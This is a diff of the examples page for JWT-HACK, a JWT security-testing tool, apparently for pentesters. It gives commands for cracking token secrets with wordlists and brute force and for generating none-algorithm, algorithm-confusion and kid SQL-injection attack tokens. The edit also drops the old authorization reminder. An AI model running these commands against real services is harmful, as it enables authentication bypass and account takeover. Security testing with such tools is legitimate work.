@@ -4,166 +4,98 @@ title = "Examples"
 weight = 4
 +++
 
-Practical examples for common JWT-HACK use cases and workflows.
+Copy-paste recipes for the things people reach for most. For a guided first run, start with the [quick start](/get_started/quickstart/); for every flag, see the [command pages](/usage/commands/).
 
-## Basic Operations
-
-### Decode a JWT Token
+## Read and sign
 
 ```bash
-# Decode and display token contents
-jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA
+# Decode a token (no secret needed)
+jwt-hack decode "$TOKEN"
+
+# Sign with an HMAC secret
+jwt-hack encode '{"sub":"1234","name":"John Doe","admin":true}' --secret=mysecret
+
+# Sign with an RSA key
+jwt-hack encode '{"sub":"1234","role":"admin"}' --private-key=private.pem --algorithm=RS256
+
+# Verify a signature, and reject if expired
+jwt-hack verify "$TOKEN" --secret=mysecret --validate-exp
 ```
 
-### Create a New JWT
+## Crack a weak secret
 
 ```bash
-# Create with HMAC-SHA256
-jwt-hack encode '{"sub":"1234", "name":"John Doe", "admin":true}' --secret=mysecret
+# Dictionary attack with your own wordlist
+jwt-hack crack -w rockyou.txt "$TOKEN"
 
-# Create with RSA
-jwt-hack encode '{"sub":"1234", "role":"admin"}' --private-key=private.pem --algorithm=RS256
+# No wordlist handy? Pull a known-secrets list by number
+jwt-hack crack -p 3 "$TOKEN"
+
+# Brute force a short secret across every core
+jwt-hack crack -m brute "$TOKEN" --preset aZ19 --max=4 --power
 ```
 
-### Verify JWT Signature
+## Generate attack tokens
 
 ```bash
-# Verify HMAC token
-jwt-hack verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIG --secret=mysecret
+# Everything, piped to a file for an Intruder-style runner
+jwt-hack payload "$TOKEN" --target=all > payloads.txt
 
-# Verify RSA token with expiration
-jwt-hack verify <RSA_TOKEN> --private-key=public.pem --validate-exp
+# Just the none-algorithm variants
+jwt-hack payload "$TOKEN" --target=none
+
+# Algorithm confusion, forged and signed with the server's public key
+jwt-hack payload "$RSA_TOKEN" --target=alg_confusion --public-key=./server-pub.pem
 ```
 
-## Security Testing Workflows
+See [payload](/usage/commands/payload/) for the full target list.
 
-### Full Token Analysis
+## A full pass on one token
 
 ```bash
-# Step 1: Decode to understand structure
-jwt-hack decode <TOKEN>
+# 1. See what it is
+jwt-hack decode "$TOKEN"
 
-# Step 2: Try cracking the secret
-jwt-hack crack -w wordlist.txt <TOKEN>
+# 2. Triage: weaknesses, weak secret, suggested payloads
+jwt-hack scan "$TOKEN"
 
-# Step 3: Generate attack payloads
-jwt-hack payload <TOKEN> --target=all
+# 3. If scan flags a weak secret, crack it for real
+jwt-hack crack -w rockyou.txt "$TOKEN"
+
+# 4. If the secret holds, probe parsing and key handling
+jwt-hack payload "$TOKEN" --target=none,alg_confusion,kid_sql
 ```
 
-### Password Cracking
+## Custom headers
+
+Each header is its own `key=value` flag, not a JSON object. This is how you set a `kid`:
 
 ```bash
-# Quick dictionary attack with common passwords
-jwt-hack crack -w /usr/share/wordlists/rockyou.txt <TOKEN>
-
-# Brute force attack (short secrets)
-jwt-hack crack -m brute <TOKEN> --max=4 --power
-
-# Custom wordlist with verbose output
-jwt-hack crack -w custom-secrets.txt <TOKEN> --verbose
-```
-
-### None Algorithm Bypass
-
-```bash
-# Generate none algorithm payloads
-jwt-hack payload <TOKEN> --target=none
-
-# Test each variant manually
-```
-
-## Advanced Use Cases
-
-### Compressed Tokens
-
-```bash
-# Create compressed JWT
-jwt-hack encode '{"data":"very long payload content..."}' --secret=test --compress
-
-# Decode automatically handles decompression
-jwt-hack decode <COMPRESSED_TOKEN>
-
-# Crack compressed token
-jwt-hack crack -w wordlist.txt <COMPRESSED_TOKEN>
-```
-
-### Custom Headers
-
-```bash
-# Add custom header fields (one --header key=value per parameter)
 jwt-hack encode '{"sub":"1234"}' \
   --secret=test \
   --header kid=key-123 \
   --header x5u=https://example.com/certs
 ```
 
-### Multiple Algorithms
+## Compressed tokens
+
+`encode --compress` adds `"zip":"DEF"`; decode and crack both unpack it for you, no extra flag.
 
 ```bash
-# HS256 (HMAC SHA-256)
-jwt-hack encode '{"sub":"1234"}' --secret=secret --algorithm=HS256
-
-# HS512 (HMAC SHA-512)
-jwt-hack encode '{"sub":"1234"}' --secret=secret --algorithm=HS512
-
-# RS256 (RSA SHA-256)
-jwt-hack encode '{"sub":"1234"}' --private-key=rsa.pem --algorithm=RS256
-
-# ES256 (ECDSA SHA-256)
-jwt-hack encode '{"sub":"1234"}' --private-key=ec.pem --algorithm=ES256
+jwt-hack encode '{"data":"...long payload..."}' --secret=test --compress
+jwt-hack decode "$COMPRESSED_TOKEN"
+jwt-hack crack -w wordlist.txt "$COMPRESSED_TOKEN"
 ```
 
-## Integration with Other Tools
-
-### With curl
+## With other tools
 
 ```bash
-# Create token and use in API request
+# Sign a token and send it in a request
 TOKEN=$(jwt-hack encode '{"sub":"user123"}' --secret=mysecret)
 curl -H "Authorization: Bearer $TOKEN" https://api.example.com/data
+
+# Pull one claim out of a decode
+jwt-hack --json decode "$TOKEN" | jq '.payload.sub'
 ```
 
-### With jq
-
-```bash
-# Extract specific claims from decoded token
-jwt-hack decode <TOKEN> --json | jq '.payload.sub'
-```
-
-## Performance Optimization
-
-### Parallel Cracking
-
-```bash
-# Use all CPU cores
-jwt-hack crack -m brute <TOKEN> --max=5 --power
-
-# Custom concurrency
-jwt-hack crack -w huge-wordlist.txt <TOKEN> -c 16
-```
-
-## Best Practices
-
-### Always Decode First
-
-```bash
-# Before any attack, understand the token
-jwt-hack decode <TOKEN>
-```
-
-### Use Targeted Wordlists
-
-```bash
-# Start with small, targeted wordlists
-jwt-hack crack -w top-100.txt <TOKEN>
-
-# Then try larger sets if needed
-jwt-hack crack -w rockyou.txt <TOKEN>
-```
-
-### Responsible Testing
-
-- Only test systems you own or have permission to test
-- Always get written authorization
-- Follow responsible disclosure practices
-- Document all testing activities
+For wiring `jwt-hack` into scripts and CI with `--json`, see [Scripting & Automation](/advanced/scripting-automation/).
